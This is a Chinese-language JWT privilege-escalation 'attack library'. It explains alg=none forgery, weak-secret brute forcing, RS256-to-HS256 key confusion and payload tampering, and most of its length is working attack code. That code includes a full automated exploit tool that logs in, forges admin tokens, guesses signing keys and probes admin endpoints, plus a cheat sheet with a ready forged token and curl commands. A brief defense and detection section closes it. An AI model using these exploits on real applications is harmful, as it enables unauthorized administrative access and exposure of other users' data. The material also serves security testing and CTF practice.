# JWT - 权限提升攻击库

## 概述

JWT(JSON Web Token)是一种常用的身份认证机制。JWT权限提升漏洞发生在应用程序对JWT的验证不当,允许攻击者通过修改JWT payload中的权限字段(如role、isAdmin、isMaster等)来提升自己的权限,访问管理员功能或敏感数据。

**核心威胁**: 弱JWT验证 → Payload修改 → 签名绕过 → 权限提升

## JWT结构

### 三部分组成

```
Header.Payload.Signature

eyJhbGc6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.9Xm3kF7fH8N2pQ
```

**Header** (Base64编码):
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload** (Base64编码):
```json
{
  "user": "admin",
  "role": "user",
  "isMaster": 0,
  "email": "user@test.com"
}
```

**Signature**:
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

## 核心攻击技术

### 1. 算法混淆攻击(alg=none)

**技术**: 将算法改为"none",移除签名部分

```python
import base64
import json

# 原始JWT
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9.signature

# 修改header
header = {
    "alg": "none",  # 改为none
    "typ": "JWT"
}

# 修改payload提升权限
payload = {
    "user": "admin",
    "role": "admin",  # 改为admin
    "isMaster": 1     # 改为1
}

# 编码
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# 构造JWT (注意末尾的点)
jwt = f"{header_b64}.{payload_b64}."
```

**应用场景**:
- 应用未检查algorithm字段
- 接受alg=none的JWT
- 签名验证可被绕过

### 2. 弱密钥爆破

**技术**: 暴力破解JWT签名密钥

```python
import jwt
import hashlib

# 已知的JWT
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 常见弱密钥
common_secrets = [
    'secret', 'password', '123456', 'admin',
    'qwerty', 'jwt', 'key', 'secretkey',
    '', 'null', 'undefined'
]

for secret in common_secrets:
    try:
        decoded = jwt.decode(token, secret, algorithms=['HS256'])
        print(f"[+] 找到密钥: {secret}")
        print(f"[+] Payload: {decoded}")
        break
    except:
        pass
```

**工具**: 
- `jwt_tool`: 专业JWT攻击工具
- `hashcat`: 密码破解工具(支持JWT)

### 3. 密钥混淆攻击(RS256→HS256)

**技术**: 将RS256算法改为HS256,使用公钥作为密钥

```python
import jwt

# 应用使用RS256(非对称加密)
# 攻击者获取了公钥

public_key = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBg...
-----END PUBLIC KEY-----
"""

# 修改payload
payload = {
    "user": "admin",
    "isMaster": 1
}

# 使用HS256和公钥签名
token = jwt.encode(payload, public_key, algorithm='HS256')

# 修改header中的alg为HS256
# 服务器可能会用公钥验证HS256签名
```

**原理**: 服务器混淆了算法,用RS256的公钥验证HS256签名

### 4. Payload修改

**技术**: 修改JWT payload中的权限字段

```python
import jwt
import base64
import json

def modify_jwt_payload(token, modifications):
    """
    修改JWT payload
    
    Args:
        token: 原始JWT
        modifications: 要修改的字段 dict
    
    Returns:
        修改后的JWT (无签名)
    """
    parts = token.split('.')
    
    # 解码payload
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # 修改字段
    payload.update(modifications)
    
    # 重新编码
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).decode().rstrip('=')
    
    # 构造新JWT (alg=none)
    header = base64.urlsafe_b64encode(
        json.dumps({"alg":"none","typ":"JWT"}).encode()
    ).decode().rstrip('=')
    
    return f"{header}.{new_payload}."

# 使用
original_jwt = "eyJhbGc..."
modified_jwt = modify_jwt_payload(original_jwt, {
    "role": "admin",
    "isMaster": 1,
    "isAdmin": True
})
```

### 5. 时间戳绕过

**技术**: 修改exp(过期时间)延长JWT有效期

```python
import time

# 修改payload中的时间字段
modifications = {
    "exp": int(time.time()) + 86400 * 365,  # 延长1年
    "iat": int(time.time()) - 86400,        # 签发时间提前
    "isMaster": 1
}
```

### 6. 用户ID伪造

**技术**: 修改user_id访问他人资源

```python
# 原始payload
{
    "user_id": 2,
    "email": "attacker@test.com"
}

# 修改为管理员ID
{
    "user_id": 1,  # 管理员通常是ID 1
    "email": "admin@test.com"
}
```

## 完整攻击工具

### JWT权限提升自动化工具

```python
#!/usr/bin/env python3
"""
JWT权限提升自动化利用工具
支持多种JWT攻击技术
"""

import requests
import jwt
import base64
import json
import sys
from datetime import datetime, timedelta

class JWTPrivilegeEscalation:
    def __init__(self, target_url):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        
    def login(self, email, password):
        """
        登录获取JWT
        
        Args:
            email: 邮箱
            password: 密码
        
        Returns:
            JWT token
        """
        print(f"[*] 登录: {email}")
        
        login_urls = [
            '/api/auth',
            '/api/login',
            '/login',
            '/auth/login',
        ]
        
        for url in login_urls:
            try:
                r = self.session.post(
                    self.target + url,
                    json={'email': email, 'password': password},
                    timeout=10
                )
                
                if r.status_code == 200:
                    data = r.json()
                    if 'token' in data:
                        print(f"[+] 获取到JWT")
                        return data['token']
            except:
                pass
        
        print("[-] 登录失败")
        return None
    
    def decode_jwt(self, token):
        """
        解码JWT (不验证签名)
        
        Args:
            token: JWT token
        
        Returns:
            (header, payload)
        """
        try:
            # 不验证签名解码
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            
            print(f"[*] JWT Header: {json.dumps(header, indent=2)}")
            print(f"[*] JWT Payload: {json.dumps(payload, indent=2)}")
            
            return header, payload
        except Exception as e:
            print(f"[-] 解码失败: {e}")
            return None, None
    
    def attack_alg_none(self, original_token, privilege_fields):
        """
        算法混淆攻击 (alg=none)
        
        Args:
            original_token: 原始JWT
            privilege_fields: 权限字段修改 dict
        
        Returns:
            修改后的JWT
        """
        print("[*] 尝试alg=none攻击...")
        
        header, payload = self.decode_jwt(original_token)
        if not payload:
            return None
        
        # 修改header
        new_header = {
            "alg": "none",
            "typ": "JWT"
        }
        
        # 修改payload
        payload.update(privilege_fields)
        
        # Base64编码
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(new_header).encode()
        ).decode().rstrip('=')
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip('=')
        
        # 构造新JWT (注意末尾的点)
        new_token = f"{header_b64}.{payload_b64}."
        
        print(f"[+] 生成alg=none JWT")
        return new_token
    
    def attack_weak_secret(self, token):
        """
        弱密钥爆破
        
        Args:
            token: JWT token
        
        Returns:
            找到的密钥或None
        """
        print("[*] 尝试弱密钥爆破...")
        
        common_secrets = [
            'secret', 'password', '123456', 'admin',
            'qwerty', 'jwt', 'key', 'secretkey',
            'your-secret-key', 'my-secret', 'test',
            '', 'null', 'undefined', 'secret123'
        ]
        
        for secret in common_secrets:
            try:
                decoded = jwt.decode(token, secret, algorithms=['HS256'])
                print(f"[+] 找到密钥: '{secret}'")
                return secret
            except:
                pass
        
        print("[-] 未找到弱密钥")
        return None
    
    def modify_and_sign(self, token, secret, modifications):
        """
        修改payload并重新签名
        
        Args:
            token: 原始JWT
            secret: 签名密钥
            modifications: 修改的字段
        
        Returns:
            新JWT
        """
        print("[*] 修改payload并重新签名...")
        
        header, payload = self.decode_jwt(token)
        if not payload:
            return None
        
        # 修改payload
        payload.update(modifications)
        
        # 重新签名
        new_token = jwt.encode(payload, secret, algorithm='HS256')
        
        print(f"[+] 生成新JWT")
        return new_token
    
    def test_jwt(self, token):
        """
        测试JWT是否有效
        
        Args:
            token: JWT token
        
        Returns:
            bool: 是否成功
        """
        print("[*] 测试JWT...")
        
        # 尝试访问受保护的资源
        protected_urls = [
            '/adminpanel/profile',
            '/admin/profile',
            '/api/admin',
            '/api/user/profile',
        ]
        
        for url in protected_urls:
            try:
                r = self.session.get(
                    self.target + url,
                    cookies={'token': token},
                    headers={'Authorization': f'Bearer {token}'},
                    timeout=10
                )
                
                if r.status_code == 200:
                    print(f"[+] 访问成功: {url}")
                    
                    # 检查FLAG
                    if 'flag' in r.text.lower():
                        import re
                        flag = re.search(r'flag\{[^}]+\}', r.text, re.I)
                        if flag:
                            print(f"[+] FLAG: {flag.group()}")
                            return True
                    
                    return True
            except:
                pass
        
        return False
    
    def full_exploit(self, email, password):
        """
        完整利用流程
        
        Args:
            email: 邮箱
            password: 密码
        """
        print("=" * 60)
        print("[*] JWT权限提升完整利用")
        print("=" * 60)
        
        # 1. 登录获取JWT
        token = self.login(email, password)
        if not token:
            return False
        
        print()
        
        # 2. 解码JWT
        header, payload = self.decode_jwt(token)
        if not payload:
            return False
        
        print()
        
        # 3. 识别权限字段
        privilege_fields = {}
        
        for key in ['isMaster', 'isAdmin', 'role', 'admin', 'master']:
            if key in payload:
                if key == 'role':
                    privilege_fields['role'] = 'admin'
                else:
                    privilege_fields[key] = 1 if isinstance(payload[key], int) else True
                print(f"[*] 发现权限字段: {key} = {payload[key]}")
        
        if not privilege_fields:
            print("[*] 未发现明显的权限字段,尝试常见字段...")
            privilege_fields = {
                'isMaster': 1,
                'isAdmin': True,
                'role': 'admin'
            }
        
        print()
        
        # 4. 尝试alg=none攻击
        print("[*] 步骤1: alg=none攻击...")
        modified_token = self.attack_alg_none(token, privilege_fields)
        if modified_token and self.test_jwt(modified_token):
            print("[+] alg=none攻击成功!")
            return True
        
        print()
        
        # 5. 尝试弱密钥爆破
        print("[*] 步骤2: 弱密钥爆破...")
        secret = self.attack_weak_secret(token)
        if secret:
            new_token = self.modify_and_sign(token, secret, privilege_fields)
            if new_token and self.test_jwt(new_token):
                print("[+] 弱密钥攻击成功!")
                return True
        
        print()
        print("[-] 所有攻击方法均未成功")
        return False

def exploit_jwt_privilege_escalation(target_url, email='test@test.com', password='test'):
    """
    JWT权限提升利用入口
    
    Args:
        target_url: 目标URL
        email: 邮箱
        password: 密码
    """
    print(f"[*] 目标: {target_url}")
    print(f"[*] 用户: {email}")
    print()
    
    exploiter = JWTPrivilegeEscalation(target_url)
    success = exploiter.full_exploit(email, password)
    
    if success:
        print("\n[+] 攻击成功!")
    else:
        print("\n[-] 攻击未成功")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法:")
        print(f"  {sys.argv[0]} <target_url> [email] [password]")
        print()
        print("示例:")
        print(f"  {sys.argv[0]} http://target:3000")
        print(f"  {sys.argv[0]} http://target:3000 user@test.com pass123")
        sys.exit(1)
    
    target = sys.argv[1]
    email = sys.argv[2] if len(sys.argv) > 2 else 'test@test.com'
    password = sys.argv[3] if len(sys.argv) > 3 else 'test'
    
    exploit_jwt_privilege_escalation(target, email, password)
```

## 实战场景

### 场景1: isMaster字段提升

**原始JWT Payload**:
```json
{
  "email": "user@test.com",
  "isMaster": 0
}
```

**修改为**:
```json
{
  "email": "user@test.com",
  "isMaster": 1
}
```

**利用**:
```python
import jwt
import base64

# alg=none攻击
header = {"alg": "none", "typ": "JWT"}
payload = {"email": "user@test.com", "isMaster": 1}

h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

modified_jwt = f"{h}.{p}."
```

### 场景2: role字段修改

```python
# 原始
{"user": "attacker", "role": "user"}

# 修改
{"user": "attacker", "role": "admin"}
```

### 场景3: 用户ID伪造

```python
# 访问管理员资源
{"user_id": 1, "email": "admin@test.com"}
```

## 手动测试命令

### 解码JWT

```bash
# 安装jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# 解码JWT
python3 jwt_tool.py <JWT_TOKEN>
```

### alg=none攻击

```python
import jwt
import json
import base64

token = "eyJhbGc..."

# 解码
payload = jwt.decode(token, options={"verify_signature": False})

# 修改
payload['isMaster'] = 1

# alg=none
header = {"alg": "none", "typ": "JWT"}
h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

new_token = f"{h}.{p}."
print(new_token)
```

### 测试修改后的JWT

```bash
# 使用Cookie
curl http://target/admin -b "token=<NEW_JWT>"

# 使用Header
curl http://target/admin -H "Authorization: Bearer <NEW_JWT>"
```

## Payload速查表

### alg=none攻击
```
# Header
{"alg":"none","typ":"JWT"}

# Payload (修改权限字段)
{"user":"admin","isMaster":1}

# 完整JWT
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJpc01hc3RlciI6MX0.
```

### 常见权限字段
```json
"isMaster": 1
"isAdmin": true
"role": "admin"
"admin": true
"privilege": "admin"
"level": 9999
```

## 防御措施

### 1. 强制算法验证

```python
# 不安全
jwt.decode(token, secret)

# 安全
jwt.decode(token, secret, algorithms=['HS256'])
```

### 2. 拒绝alg=none

```python
if header.get('alg') == 'none':
    raise ValueError("Invalid algorithm")
```

### 3. 使用强密钥

```python
import secrets

secret = secrets.token_urlsafe(32)
# 至少32字节随机密钥
```

### 4. 服务端权限验证

```python
# 不要仅依赖JWT中的权限字段
# 从数据库查询实际权限

user = db.get_user(payload['user_id'])
if user.role != 'admin':
    return 403
```

## 检测特征

1. **alg=none**: JWT末尾有单独的点
2. **修改痕迹**: payload字段值异常
3. **签名验证失败**: 但应用仍接受
4. **权限字段**: isMaster、isAdmin等可疑字段

## 总结

JWT权限提升是常见的认证绕过方式,主要利用点:
- 算法混淆(alg=none)
- 弱密钥爆破
- Payload修改
- 签名验证不当

**关键攻击路径**: 获取JWT → 解码分析 → 修改权限字段 → 绕过签名验证 → 权限提升

**防御重点**: 强制算法验证 + 强密钥 + 服务端权限验证,不要仅依赖JWT中的声明。
